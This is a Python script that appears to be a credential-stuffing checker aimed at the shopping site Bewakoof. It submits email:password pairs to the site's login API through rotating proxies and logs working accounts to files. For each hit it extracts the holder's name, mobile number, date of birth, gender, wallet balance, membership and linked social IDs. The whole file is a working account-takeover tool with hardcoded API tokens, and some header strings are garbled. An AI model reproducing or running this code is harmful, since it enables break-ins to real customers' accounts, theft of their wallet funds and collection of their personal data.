import requests,json,termcolor,colorama,random
colorama.init()
invalid,ban,custom,hits =0,0,0,0
Proxylist = []
protocol = ""
def Proxy():
	RandomProxy = random.choice(Proxylist)
	RandomProxy = RandomProxy.replace('\n','')
	try:
	        proxy = RandomProxy.split(':')
	        if len(proxy) == 2:
	            return {
	                'http' : f'{protocol}://{proxy[0]}:{proxy[1]}',
	                'https' : f'{protocol}://{proxy[0]}:{proxy[1]}'
	            }
	        elif len(proxy) == 4:
	            return {
	                'http' : f'{protocol}://{proxy[2]}:{proxy[3]}@{proxy[0]}:{proxy[1]}',
	                'https' : f'{protocol}://{proxy[2]}:{proxy[3]}@{proxy[0]}:{proxy[1]}'
	            }
	        else: Proxy()
	except: Proxy()
def check(mail,pw,Proxies=True,saver=True):
	global invalid,ban,custom,hits
	re = requests.session()
	try:
		if Proxies == False:
			r = re.post("https://www.bewakoof.com/v1/authentication",json = {"authentication":{"email":mail,
			"password":pw,
			'referrer_code':"null"}},headers = {"Host":"www.bewakoof.com",
			"content-length":"97",
			"sec-ch-ua":"\",Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"",
			"switch-platform":"false",
			"sec-ch-ua-mobile":"?1",
			"user-agent":"Mozilla/5.0 (Linux; Android 10; M2004J19PI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
			"content-type":"application/json",
			"token":"f024cad2ebc0ae72b55301ac91ZTdiZ3",
			"ab-id":"10",
			"api-token":"NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLTk4MDAtNzYxMGEzOGNjYzNk",
			"client-device-token":"NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLToverAide: POST",
			"microapp":"",
			"x-http-method-override":"POST",
			"accept":"*/*",
			"originrigins":"//www.bewakoof.com",
			"sec-fetch-site":"same-origin",
			"sec-fetch-mode":"cors",
			"sec-fetch-dest":"empty",
			"referer":"https://www.bewakoof.com/login/email",
			"accept-language":"en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7"}).text
		else:
			r = re.post("https://www.bewakoof.com/v1/authentication",json = {"authentication":{"email":mail,
			"password":pw,
			'referrer_code':"null"}},headers = {"Host":"www.bewakoof.com",
			"content-length":"97",
			"sec-ch-ua":"\",Not A;Brand\";v=\"99\", \"Chromium\";v=\"90\", \"Google Chrome\";v=\"90\"",
			"switch-platform":"false",
			"sec-ch-ua-mobile":"?1",
			"user-agent":"Mozilla/5.0 (Linux; Android 10; M2004J19PI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
			"content-type":"application/json",
			"token":"f024cad2ebc0ae72b55301ac91ZTdiZ3",
			"ab-id":"10",
			"api-token":"NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLTk4MDAtNzYxMGEzOGNjYzNk",
			"client-device-token":"NGNlNTUwYTc0MjBjYzQzZTdiZTNhMmY1NjNhMThhOGU6OGI1NThkZDgtOGQ5ZS00OWYxLToverAide: POST",
			"microapp":"",
			"x-http-method-override":"POST",
			"accept":"*/*",
			"originrigins":"//www.bewakoof.com",
			"sec-fetch-site":"same-origin",
			"sec-fetch-mode":"cors",
			"sec-fetch-dest":"empty",
			"referer":"https://www.bewakoof.com/login/email",
			"accept-language":"en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7"},proxies = Proxy()).text
	except:
		check(mail,pw,Proxies=Proxies,saver=saver)
	if r.__contains__("Incorrect login details. Please try again."):
		invalid += 1
		print(termcolor.colored(f"[-]{mail}:{pw} [INVALID]",color = 'red'))
	elif r.__contains__("token"):
		tree = json.loads(r)
		wallet = tree['wallet_amount']
		if int(wallet) == 0:
			custom += 1
			print(termcolor.colored(f'[ * ] {mail}:{pw} [CUSTOM]',color = 'yellow'))
			if saver == True: cust = open('Bewakoof_Customs.txt','a').write(f'{mail}:{pw}\n')
		elif r.__contains__('"wallet_amount":0'):
			custom += 1
			print(termcolor.colored(f'[ * ] {mail}:{pw} [CUSTOM]',color = 'yellow'))
			if saver == True: cust = open('Bewakoof_Customs.txt','a').write(f'{mail}:{pw}\n')
		elif int(wallet) != 0:
			if r.__contains__('"wallet_amount":0'):
				custom += 1
				print(termcolor.colored(f'[ * ] {mail}:{pw} [CUSTOM]',color = 'yellow'))
				if saver == True: cust = open('Bewakoof_Customs.txt','a').write(f'{mail}:{pw}\n')
			else:
				hits += 1
				if "membership.name" in r:
					pln = 1
					plan = tree['membership.name']
					end_date = tree['end_date']
				else: pln = 0
				F_name = tree['first_name']
				L_name = tree['last_name']
				mobile = tree['mobile']
				dob = tree['date_of_birth']
				referral_code = tree['referral_code']
				facebook = tree['facebook_id']
				google = tree['google_id']
				gender = tree['gender']
				if pln == 1:
					print(termcolor.colored(f"[+] {mail}:{pw} | Name = {F_name} {L_name} | Mobile = {mobile} | Wallet Amount = {wallet} | DOB = {dob} | Gender = {gender} | REFERRAL CODE = {referral_code} | Plan = {plan} | End Date = {end_date} | Linked From Facebook = {facebook} | Linked From Google = {google}",color = 'green'))
					if saver == True: cust = open('Bewakoof_Hits.txt','a').write(f'{mail}:{pw} | Name = {F_name} {L_name} | Mobile = {mobile} | Wallet Amount = {wallet} | DOB = {dob} | Gender = {gender} | REFERRAL CODE = {referral_code} | Plan = {plan} | End Date = {end_date} | Linked From Facebook = {facebook} | Linked From Google = {google}\n')
				else:
					print(termcolor.colored(f"[+] {mail}:{pw} | Name = {F_name} {L_name} | Mobile = {mobile} | Wallet Amount = {wallet} | DOB = {dob} | Gender = {gender} | REFERRAL CODE = {referral_code} | Linked From Facebook = {facebook} | Linked From Google = {google}",color = 'green'))
					if saver == True: cust = open('Bewakoof_Hits.txt','a').write(f'{mail}:{pw} | Name = {F_name} {L_name} | Mobile = {mobile} | Wallet Amount = {wallet} | DOB = {dob} | Gender = {gender} | REFERRAL CODE = {referral_code} | Linked From Facebook = {facebook} | Linked From Google = {google}\n')	
		else:
			custom += 1
			print(termcolor.colored(f'[ * ] {mail}:{pw} [CUSTOM]',color = 'yellow'))
			if saver == True: cust = open('Bewakoof_Customs.txt','a').write(f'{mail}:{pw}\n')
	else:
		ban += 1
		print(termcolor.colored(f"[-]{mail}:{pw} [BANNED]",color = 'red'))
